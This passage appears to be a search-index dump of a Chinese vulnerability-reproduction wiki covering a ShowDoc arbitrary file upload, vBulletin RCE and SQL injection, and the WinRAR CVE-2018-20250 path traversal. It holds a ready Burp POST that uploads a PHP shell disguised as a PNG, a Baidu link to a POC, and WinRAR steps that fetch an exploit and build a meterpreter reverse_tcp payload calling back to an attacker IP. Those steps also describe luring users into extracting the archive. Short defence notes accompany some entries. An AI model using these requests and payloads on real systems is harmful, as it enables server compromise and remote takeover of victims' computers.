https://github.com/star7th/showdoc/blob/master/server/Application/Api/Controller/PageController.class.php#L212 \u7684uploadImg() \u6709\u8fc7\u6ee4,\u9644\u4ef6\u4e0a\u4f20upload()\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4.\u53ef\u4ee5\u76f4\u63a5\u4e0a\u4f20shell\u3002 burp\u7684post\u6570\u636e\u5927\u81f4\u5982\u4e0b\uff1a POST /show/server/index.php?s=/api/page/upload HTTP/1.1 ------WebKitFormBoundaryzOQywSoNbAALAwKn Content-Disposition: form-data; name=\"page_id\" 22 ------WebKitFormBoundaryzOQywSoNbAALAwKn Content-Disposition: form-data; name=\"item_id\" 3 ------WebKitFormBoundaryzOQywSoNbAALAwKn Content-Disposition: form-data; name=\"file\"; filename=\"cs.php\" Content-Type: image/png \u0089PNG \u001a ------WebKitFormBoundaryzOQywSoNbAALAwKn-- \u9632\u5fa1 \u00b6 \u589e\u52a0\u8fc7\u6ee4\uff0c\u540c\u65f6\u8fd0\u7ef4\u4eba\u5458\u8bbe\u7f6e\u4e0a\u4f20\u76ee\u5f55\u7981\u6b62\u6267\u884c\uff0c\u53ea\u5141\u8bb8\u5199\u5165\u8bfb\u53d6\uff0c\u505a\u597d\u6743\u9650\u5206\u914d\u3002 \u6765\u6e90\u4e8e\u571f\u53f8\uff1a https://www.t00ls.net/thread-56340-1-1.html \u7531 Mrxn \u6574\u7406 \uff0c\u6b22\u8fce\u5927\u5bb6\u524d\u5f80\u571f\u53f8\u6295\u7a3f\u6ce8\u518c\u53d1\u8a00\u3002","title":"Showdoc\u7684api page\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20getshell"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/showdoc/showdoc%E7%9A%84api_page%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#showdocapi_page","text":"","title":"showdoc\u7684api_page\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u3010\u9700\u8981\u767b\u5f55\u3011"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/showdoc/showdoc%E7%9A%84api_page%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_1","text":"ShowDoc is a tool greatly applicable for an IT team to share documents online\u4e00\u4e2a\u975e\u5e38\u9002\u5408IT\u56e2\u961f\u7684\u5728\u7ebfAPI\u6587\u6863\u3001\u6280\u672f\u6587\u6863\u5de5\u5177 \u5b98\u7f51 \uff1a https://www.showdoc.cc/ GitHub\u4e3b\u9875\uff1a https://github.com/star7th/showdoc \u5f53\u524d\u6d4b\u8bd5\u7248\u672c\uff1a v2.6.7","title":"\u80cc\u666f"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/showdoc/showdoc%E7%9A%84api_page%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_2","text":"https://github.com/star7th/showdoc/blob/master/server/Application/Api/Controller/PageController.class.php#L258 //\u4e0a\u4f20\u9644\u4ef6 public function upload(){ $login_user = $this->checkLogin(); $item_id = I(\"item_id/d\") ? I(\"item_id/d\") : 0 ; $page_id = I(\"page_id/d\") ? I(\"page_id/d\") : 0 ; $uploadFile = $_FILES['file'] ; if (!$page_id) { $this->sendError(10103,\"\u8bf7\u81f3\u5c11\u5148\u4fdd\u5b58\u4e00\u6b21\u9875\u9762\u5185\u5bb9\"); return; } if (!$this->checkItemPermn($login_user['uid'] , $item_id)) { $this->sendError(10103); return; } if (!$uploadFile) { return false; } if (strstr(strip_tags(strtolower($_FILES['editormd-image-file']['name'])), \".php\") ) { return false; } $upload = new \\Think\\Upload();// \u5b9e\u4f8b\u5316\u4e0a\u4f20\u7c7b $upload->maxSize = 4145728000 ;// \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u5927\u5c0f $upload->rootPath = './../Public/Uploads/';// \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u76ee\u5f55 $upload->savePath = '';// \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u5b50\u76ee\u5f55 $info = $upload->uploadOne($uploadFile) ; if(!$info) {// \u4e0a\u4f20\u9519\u8bef\u63d0\u793a\u9519\u8bef\u4fe1\u606f $this->error($upload->getError()); return; }else{// \u4e0a\u4f20\u6210\u529f \u83b7\u53d6\u4e0a\u4f20\u6587\u4ef6\u4fe1\u606f $url = get_domain().__ROOT__.substr($upload->rootPath,1).$info['savepath'].$info['savename'] ; $insert = array( \"uid\" => $login_user['uid'], \"item_id\" => $item_id, \"page_id\" => $page_id, \"display_name\" => $uploadFile['name'], \"file_type\" => $uploadFile['type'], \"file_size\" => $uploadFile['size'], \"real_url\" => $url, \"addtime\" => time(), ); $ret = D(\"UploadFile\")->add($insert); echo json_encode(array(\"url\"=>$url,\"success\"=>1)); } } \u76f8\u6bd4 https://github.com/star7th/showdoc/blob/master/server/Application/Api/Controller/PageController.class.php#L212 \u7684uploadImg() \u6709\u8fc7\u6ee4,\u9644\u4ef6\u4e0a\u4f20upload()\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4.\u53ef\u4ee5\u76f4\u63a5\u4e0a\u4f20shell\u3002 burp\u7684post\u6570\u636e\u5927\u81f4\u5982\u4e0b\uff1a POST /show/server/index.php?s=/api/page/upload HTTP/1.1 ------WebKitFormBoundaryzOQywSoNbAALAwKn Content-Disposition: form-data; name=\"page_id\" 22 ------WebKitFormBoundaryzOQywSoNbAALAwKn Content-Disposition: form-data; name=\"item_id\" 3 ------WebKitFormBoundaryzOQywSoNbAALAwKn Content-Disposition: form-data; name=\"file\"; filename=\"cs.php\" Content-Type: image/png \u0089PNG \u001a ------WebKitFormBoundaryzOQywSoNbAALAwKn--","title":"\u6f0f\u6d1e\u70b9"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/showdoc/showdoc%E7%9A%84api_page%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_3","text":"\u589e\u52a0\u8fc7\u6ee4\uff0c\u540c\u65f6\u8fd0\u7ef4\u4eba\u5458\u8bbe\u7f6e\u4e0a\u4f20\u76ee\u5f55\u7981\u6b62\u6267\u884c\uff0c\u53ea\u5141\u8bb8\u5199\u5165\u8bfb\u53d6\uff0c\u505a\u597d\u6743\u9650\u5206\u914d\u3002 \u6765\u6e90\u4e8e\u571f\u53f8\uff1a https://www.t00ls.net/thread-56340-1-1.html \u7531 Mrxn \u6574\u7406 \uff0c\u6b22\u8fce\u5927\u5bb6\u524d\u5f80\u571f\u53f8\u6295\u7a3f\u6ce8\u518c\u53d1\u8a00\u3002","title":"\u9632\u5fa1"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin%205.x%20RCE%EF%BC%88CVE-2019-16759%20%EF%BC%89/","text":"vBulletin 5.x RCE\uff08CVE-2019-16759 \uff09 \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-23 16:11:45 POC \u00b6 \u94fe\u63a5\uff1a https://pan.baidu.com/s/1KRwmpFVvgV875i0eEaypYQ \u63d0\u53d6\u7801\uff1aklwy \u4fee\u590d\u5efa\u8bae\uff1a \u00b6 \u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"vBulletin 5.x RCE\uff08CVE-2019-16759 \uff09"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin%205.x%20RCE%EF%BC%88CVE-2019-16759%20%EF%BC%89/#vbulletin-5x-rcecve-2019-16759","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-23 16:11:45","title":"vBulletin 5.x RCE\uff08CVE-2019-16759 \uff09"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin%205.x%20RCE%EF%BC%88CVE-2019-16759%20%EF%BC%89/#poc","text":"\u94fe\u63a5\uff1a https://pan.baidu.com/s/1KRwmpFVvgV875i0eEaypYQ \u63d0\u53d6\u7801\uff1aklwy","title":"POC"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin%205.x%20RCE%EF%BC%88CVE-2019-16759%20%EF%BC%89/#_1","text":"\u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"\u4fee\u590d\u5efa\u8bae\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"vBulletin5 5.6.1 SQL\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-20 16:06:02 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 5.5.6pl1\u4e4b\u524d\u7684vBulletin\uff0c5.6.0pl1\u4e4b\u524d\u76845.6.0\u548c5.6.1pl1\u4e4b\u524d\u76845.6.1\u5177\u6709\u9519\u8bef\u7684\u8bbf\u95ee\u63a7\u5236\u3002 \u5b9e\u9645\u662fnodeId\u672a\u6388\u6743sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u4e14\u5371\u5bb3\u8f83\u5927\u3002 \u5f71\u54cd\u8303\u56f4 \u00b6 vBulletin 5.5.6pl1\u4e4b\u524d\u7248\u672c vBulletin 5.6.0pl1\u4e4b\u524d\u76845.6.0\u7248\u672c vBulletin 5.6.1pl1\u4e4b\u524d\u76845.6.1\u7248\u672c payload\uff1a \u00b6 \u4fee\u590d\u5efa\u8bae \u00b6 \u5b98\u65b9\u5df2\u53d1\u5e03\u6700\u65b0\u5b89\u5168\u8865\u4e01\uff0c\u8bf7\u53ca\u65f6\u66f4\u65b0\u8865\u4e01","title":"vBulletin5 5.6.1 SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#vbulletin5-561-sql","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-20 16:06:02","title":"vBulletin5 5.6.1 SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"5.5.6pl1\u4e4b\u524d\u7684vBulletin\uff0c5.6.0pl1\u4e4b\u524d\u76845.6.0\u548c5.6.1pl1\u4e4b\u524d\u76845.6.1\u5177\u6709\u9519\u8bef\u7684\u8bbf\u95ee\u63a7\u5236\u3002 \u5b9e\u9645\u662fnodeId\u672a\u6388\u6743sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u4e14\u5371\u5bb3\u8f83\u5927\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","text":"vBulletin 5.5.6pl1\u4e4b\u524d\u7248\u672c vBulletin 5.6.0pl1\u4e4b\u524d\u76845.6.0\u7248\u672c vBulletin 5.6.1pl1\u4e4b\u524d\u76845.6.1\u7248\u672c","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#payload","text":"","title":"payload\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_3","text":"\u5b98\u65b9\u5df2\u53d1\u5e03\u6700\u65b0\u5b89\u5168\u8865\u4e01\uff0c\u8bf7\u53ca\u65f6\u66f4\u65b0\u8865\u4e01","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/","text":"WinRAR \u4ee3\u7801\u6267\u884c\u76f8\u5173\u7684CVE \u7f16\u53f7\u5982\u4e0b\uff1a CVE-2018-20250,CVE-2018-20251, CVE-2018-20252, CVE-2018-20253 \u8fd9\u91cc\u6211\u4eec\u590d\u73b0\u6700\u5f00\u59cb\u7684WinRAR\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\uff08CVE-2018-20250\uff09\u3002 \u6f0f\u6d1e\u8be6\u60c5 \u00b6 \u539f\u7406\uff1a \u00b6 WinRAR\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\uff08CVE-2018-20250\uff09\uff1a \u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eWinRAR \u6240\u4f7f\u7528\u7684\u4e00\u4e2a\u9648\u65e7\u7684\u52a8\u6001\u94fe\u63a5\u5e93UNACEV2.dll\u6240\u9020\u6210\u7684\uff0c\u8be5\u52a8\u6001\u94fe\u63a5\u5e93\u57282006 \u5e74\u88ab\u7f16\u8bd1\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u57fa\u7840\u4fdd\u62a4\u673a\u5236(ASLR,DEP \u7b49)\u3002\u8be5\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u4f5c\u7528\u662f\u5904\u7406ACE \u683c\u5f0f\u6587\u4ef6\u3002\u800c\u5728\u89e3\u538b\u5904\u7406\u8fc7\u7a0b\u4e2d\u5b58\u5728\u4e00\u5904\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e,\u5141\u8bb8\u89e3\u538b\u8fc7\u7a0b\u5199\u5165\u6587\u4ef6\u81f3\u5f00\u673a\u542f\u52a8\u9879\uff0c\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002 \u5f71\u54cd\u7248\u672c\uff1a \u00b6 WinRAR < 5.70 Beta 1 Bandizip < = 6.2.0.0 \u597d\u538b(2345\u538b\u7f29) < = 5.9.8.10907 360\u538b\u7f29 < = 4.0.0.1170 \u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\uff1a \u00b6 \u653b\u51fb\u4e0d\u80fd\u8de8\u76d8\u7b26\uff0c\u5373\u53d7\u5bb3\u8005\u8fdb\u884c\u89e3\u538b\u6587\u4ef6\u89e6\u53d1\u6f0f\u6d1e\u65f6\uff0c\u5fc5\u987b\u5728\u7cfb\u7edf\u76d8\uff0c\u4e14\u5728\u4e0d\u77e5\u9053\u8ba1\u7b97\u673a\u4e3b\u673a\u540d\u7684\u60c5\u51b5\u4e0b\uff0c\u53ea\u80fd\u5728\u4e3b\u6d4f\u89c8\u5668\u7684\u9ed8\u8ba4\u4e0b\u8f7d\u8def\u5f84\u4e0b\uff08C:\\Users\\Administrator\\Downloads\uff09\u6216\u8005\u684c\u9762\u8fdb\u884c\u89e3\u538b\uff0c\u6216\u8005\u591a\u731c\u51e0\u4e2a\u542f\u52a8\u9879\u8def\u5f84\u3002\u4ea7\u751f\u6f0f\u6d1e\u7684DLL\u6587\u4ef6\uff1aUNACEV2.DLL\uff0c\u4e0d\u80fd\u8bc6\u522b\u76f8\u5bf9\u8def\u5f84\uff0c\u6587\u4ef6\u540d\u90e8\u5206\u5fc5\u987b\u4e3a\u7edd\u5bf9\u8def\u5f84\u3002 \u4ee5\u4e0b\u662f\u51e0\u79cd\u673a\u5668\u7684\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff0c\u53ef\u4ee5\u770b\u5230\u5728\u4e2a\u4ebaPC\u4e0a\u53d7\u7528\u6237\u540d\u5f71\u54cd\uff0c\u65e0\u6cd5\u731c\u6d4b\u5230\u51c6\u786e\u7684\u8def\u5f84\uff0c\u800c\u670d\u52a1\u5668\u4e0a\u4e00\u822c\u4e0d\u4f1a\u4fee\u6539\u7528\u6237\u540d\uff0c\u6240\u4ee5\u8fd9\u4e2a\u6f0f\u6d1e\u5728\u670d\u52a1\u5668\u4e0a\u5229\u7528\u5ea6\u6bd4\u8f83\u9ad8\u3002 Win2003\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Documents and Settings\\Administrator\\\u300c\u5f00\u59cb\u300d\u83dc\u5355\\\u7a0b\u5e8f\\\u542f\u52a8 Win2008\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup Win2012\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup Win7\u3000 \u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Users\\\u7528\u6237\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup Win10\u3000\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Users\\\u7528\u6237\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u3000\u3000\u672c\u6b21\u8bd5\u9a8c\u4f7f\u7528\u7684\u662fWin2008\uff0c \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u73af\u5883\u5de5\u5177\uff1a \u00b6 \u670d\u52a1\u5668\uff1aWin2008 R2 WinRAR 5.60\u7b80\u4f53\u4e2d\u6587\u7248\uff1a https://www.rarlab.com/rar/winrar-x64-560sc.exe Python-3.7.2-amd64.exe\uff1a https://www.python.org/ftp/python/3.7.2/python-3.7.2-amd64.exe 010Editor\uff1a https://download.sweetscape.com/010EditorWin64Installer901.exe Wace\u548c\u6a21\u677f\u6587\u4ef6\uff1a https://github.com/360-A-Team/CVE-2018-20250 EXP\uff1a https://github.com/WyAtu/CVE-2018-20250 \u6f0f\u6d1e\u590d\u73b0\uff1a \u00b6 \u8fd9\u91cc\u6211\u4eec\u5199\u4e00\u4e2abat\uff0c\u8fdb\u884c\u5f39\u7a97\u6f14\u793a\uff1a \u7136\u540e\u6253\u5f00WinAce\uff0c\u9009\u4e2d\u6211\u4eec\u521b\u5efa\u7684\u6587\u4ef6\uff0c\u53f3\u952e\uff0c\u70b9\u51fbAdd to... \u5229\u7528WinACE\u8fdb\u884c\u538b\u7f29,\u8fd9\u91cc\u9009\u62e9store full path\u3002 \u751f\u6210\u4e4b\u540e\u6211\u4eec\u5229\u7528\u811a\u672c\u68c0\u67e5\u4e00\u4e0b\u6211\u4eec\u751f\u6210\u7684\u6587\u4ef61.ace\u7684header\u4fe1\u606f\uff1a \u8fd9\u91cc\u51e0\u4e2a\u662f\u6211\u4eec\u9700\u8981\u4fee\u6539\u7684\u53c2\u6570\u3002 \u5728010Edit\u5de5\u5177\u4e2d\u6253\u5f00\u521a\u624d\u751f\u6210\u76841.ace\u6587\u4ef6\uff0c\u5c06\u6587\u4ef6\u8def\u5f84\u66ff\u6362\u4e3a\u542f\u52a8\u9879\u8def\u5f84\u5982\u4e0b\uff0c\u7136\u540e\u53ef\u4ee5\u770b\u5230\u65b0\u7684\u5b8c\u6574\u7684\u6587\u4ef6\u8def\u5f84\u957f\u5ea6\u4e3a93\uff0c\u8f6c\u6362\u4e3a16\u8fdb\u5236\u540e\u4e3a\uff1a5D\u3002 \u4fee\u6539\u5b8c\u8fd9\u4e24\u4e2a\u5730\u65b9\u4e4b\u540e\u70b9\u51fb\u4fdd\u5b58\uff0c\u63a5\u7740\u8fd8\u9700\u8981\u4fee\u6539hdr_size\u3002 \u8fd9\u4e09\u4e2a\u5730\u65b9\u4fee\u6539\u5b8c\u6210\u4e4b\u540e\u70b9\u51fb\u4fdd\u5b58\u3002 \u6700\u540e\u5229\u7528acefile.py\u91cd\u65b0\u67e5\u770b\u6587\u4ef6header\u4fe1\u606f\u3002\u4fee\u6539acefile.py\uff0c\u57283061\u884c\u5904\u6dfb\u52a0\u4ee5\u4e0b\u8bed\u53e5\uff0c\u8f93\u51fa\u6587\u4ef6hdr_crc\u3002 print(\"[+] right_hdr_crc : {} | struct {} \".format(hex(ace_crc16(buf)),struct.pack('<H', ace_crc16(buf)))) print(\"[*] current_hdr_crc : {} | struct {}\".format(hex(hcrc),struct.pack('<H', hcrc))) \u53ef\u4ee5\u770b\u5230\u5f53\u524d\u7684hdr_crc\u4e3a\uff1a16 9A\uff0c\u6211\u4eec\u8981\u628a\u5b83\u6539\u4e3aE4 A3\uff0c\u4fdd\u5b58\u4e4b\u540e\u91cd\u65b0\u67e5\u770b\u6587\u4ef6header\u4fe1\u606f\u3002 \u4fee\u6539\u5b8c\u6210\uff0c\u5c06\u6587\u4ef6\u53e6\u5b58\u4e3a1.rar\u3002 \u9009\u62e9\u89e3\u538b\u5230\u5f53\u524d\u6587\u4ef6\u5939\u6216\u89e3\u538b\u5230\u6587\u4ef6\u59391\u90fd\u53ef\u4ee5\uff0c\u53ef\u4ee5\u770b\u5230bat\u6587\u4ef6\u6210\u529f\u89e3\u538b\u5230\u5f00\u673a\u542f\u52a8\u9879\u91cc\u3002 \u91cd\u542f\u7535\u8111\u67e5\u770b\u6548\u679c\u3002 \u590d\u73b0\u6210\u529f\uff0c\u81ea\u52a8\u8fd0\u884cbat\u6587\u4ef6\u5f39\u7a97\u3002 MSF\u5229\u7528 \u00b6 \u9996\u5148\u4e0b\u8f7dEXP\uff1a wget https://github.com/WyAtu/CVE-2018-20250/archive/master.zip \u8fd9\u91cc\u6211\u89e3\u538b/root/tools\u76ee\u5f55\u4e0b\uff1a \u7136\u540e\u5229\u7528msf\u751f\u6210\u4e00\u4e2a\u6076\u610f\u7a0b\u5e8f\uff0c\u653e\u5230\u8be5\u76ee\u5f55\u4e0b\uff1a msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.86.129 lport=4444 -f exe -o /root/tools/CVE-2018-20250-master/test.exe \u4fee\u6539exp.py\u6587\u4ef6\uff1a \u5c06evil_filename\u6539\u4e3a\u6211\u4eec\u751f\u6210\u7684\u6076\u610f\u7a0b\u5e8f\u3002 \u5c06py -3 \u6539\u4e3apython3\uff0c\u4fee\u6539\u5b8c\u6210\u4e4b\u540e\u4fdd\u5b58\uff0c\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a python3 exp.py \u6210\u529f\u751f\u6210\u653b\u51fb\u6587\u4ef6test.rar\uff0c\u53ea\u8981\u8bf1\u5bfc\u7528\u6237\u4e0b\u8f7d\u89e3\u538b\u8fd9\u4e2a\u538b\u7f29\u6587\u4ef6\u5462\uff0c\u5c31\u53ef\u5f97\u5230\u7528\u6237\u7535\u8111\u6743\u9650\uff0c\u8fd9\u91cc\u53ea\u6f14\u793a\u529f\u80fd\uff0c\u6211\u4eec\u7528python\u7b80\u5355\u5f00\u542f\u4e00\u4e2ahttp\u670d\u52a1\uff1a python -m SimpleHTTPServer \u5207\u6362\u5230win2008\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u8981\u653b\u51fb\u7684\u76ee\u6807\u673a\u5668\u3002\u4e0b\u8f7dtest.rar\uff0c\u7136\u540e\u76f4\u63a5\u5728\u4e0b\u8f7d\u76ee\u5f55\u89e3\u538b\uff08\u4e5f\u53ef\u9009\u62e9\u5728\u684c\u9762\u89e3\u538b\uff09\u3002 \u53ef\u4ee5\u770b\u5230\u5728\u7cfb\u7edf\u7684\u542f\u52a8\u8def\u5f84\u4e0b\u6210\u529f\u89e3\u538b\u51fahi.exe\u6587\u4ef6\u3002\u63a5\u7740\u6211\u4eec\u5728kali\u4e0a\u9762\u5f00\u542f\u76d1\u542c\uff0c\u7136\u540e\u91cd\u542fwin2008\u3002 \u6210\u529f\u62ff\u5230\u76ee\u6807\u673a\u5668\u6743\u9650\u3002 \u6f0f\u6d1e\u9632\u5fa1 \u00b6 \u5220\u9664\u53d7\u5f71\u54cd\u538b\u7f29\u8f6f\u4ef6\u76ee\u5f55\u4e0bUNACEV2.dll\u6587\u4ef6\u80fd\u6709\u6548\u9632\u5fa1\u3002 \u3000\u3000\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c\uff0cWinRAR \u76ee\u524d\u7248\u672c\u662f 5.70 Beta 1\u3002 \u3000\u3000\u603b\u800c\u8a00\u4e4b\uff0c\u8be5\u6f0f\u6d1e\u5e76\u6ca1\u6709\u90a3\u4e48\u81f4\u547d\u3002\u76ee\u6807\u6027\u7684\u6253\u7ad9\uff0c\u5f97\u5148\u6b3a\u9a97\u4e0b\u8f7d\uff0c\u5e76\u518d\u5728\u672a\u9632\u62a4\u7684\u670d\u52a1\u5668\u4e0a\u89e3\u538b\uff0c\u4f01\u4e1a\u670d\u52a1\u5668\u7ba1\u7406\u5458\u90fd\u5f88\u96be\u4f1a\u8fd9\u6837\u505a\u3002\u800c\u4e14\u5fc5\u987b\u5f97\u670d\u52a1\u5668\u91cd\u542f\u624d\u80fd\u751f\u6548\uff0c\u4e0d\u80fd\u76f4\u63a5\u6267\u884c\u811a\u672c\u3002","title":"WinRAR\u7a7f\u900f\u6f0f\u6d1e\uff08CVE 2018 20250\uff09"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_1","text":"","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_2","text":"WinRAR\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\uff08CVE-2018-20250\uff09\uff1a \u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eWinRAR \u6240\u4f7f\u7528\u7684\u4e00\u4e2a\u9648\u65e7\u7684\u52a8\u6001\u94fe\u63a5\u5e93UNACEV2.dll\u6240\u9020\u6210\u7684\uff0c\u8be5\u52a8\u6001\u94fe\u63a5\u5e93\u57282006 \u5e74\u88ab\u7f16\u8bd1\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u57fa\u7840\u4fdd\u62a4\u673a\u5236(ASLR,DEP \u7b49)\u3002\u8be5\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u4f5c\u7528\u662f\u5904\u7406ACE \u683c\u5f0f\u6587\u4ef6\u3002\u800c\u5728\u89e3\u538b\u5904\u7406\u8fc7\u7a0b\u4e2d\u5b58\u5728\u4e00\u5904\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e,\u5141\u8bb8\u89e3\u538b\u8fc7\u7a0b\u5199\u5165\u6587\u4ef6\u81f3\u5f00\u673a\u542f\u52a8\u9879\uff0c\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002","title":"\u539f\u7406\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_3","text":"WinRAR < 5.70 Beta 1 Bandizip < = 6.2.0.0 \u597d\u538b(2345\u538b\u7f29) < = 5.9.8.10907 360\u538b\u7f29 < = 4.0.0.1170","title":"\u5f71\u54cd\u7248\u672c\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_4","text":"\u653b\u51fb\u4e0d\u80fd\u8de8\u76d8\u7b26\uff0c\u5373\u53d7\u5bb3\u8005\u8fdb\u884c\u89e3\u538b\u6587\u4ef6\u89e6\u53d1\u6f0f\u6d1e\u65f6\uff0c\u5fc5\u987b\u5728\u7cfb\u7edf\u76d8\uff0c\u4e14\u5728\u4e0d\u77e5\u9053\u8ba1\u7b97\u673a\u4e3b\u673a\u540d\u7684\u60c5\u51b5\u4e0b\uff0c\u53ea\u80fd\u5728\u4e3b\u6d4f\u89c8\u5668\u7684\u9ed8\u8ba4\u4e0b\u8f7d\u8def\u5f84\u4e0b\uff08C:\\Users\\Administrator\\Downloads\uff09\u6216\u8005\u684c\u9762\u8fdb\u884c\u89e3\u538b\uff0c\u6216\u8005\u591a\u731c\u51e0\u4e2a\u542f\u52a8\u9879\u8def\u5f84\u3002\u4ea7\u751f\u6f0f\u6d1e\u7684DLL\u6587\u4ef6\uff1aUNACEV2.DLL\uff0c\u4e0d\u80fd\u8bc6\u522b\u76f8\u5bf9\u8def\u5f84\uff0c\u6587\u4ef6\u540d\u90e8\u5206\u5fc5\u987b\u4e3a\u7edd\u5bf9\u8def\u5f84\u3002 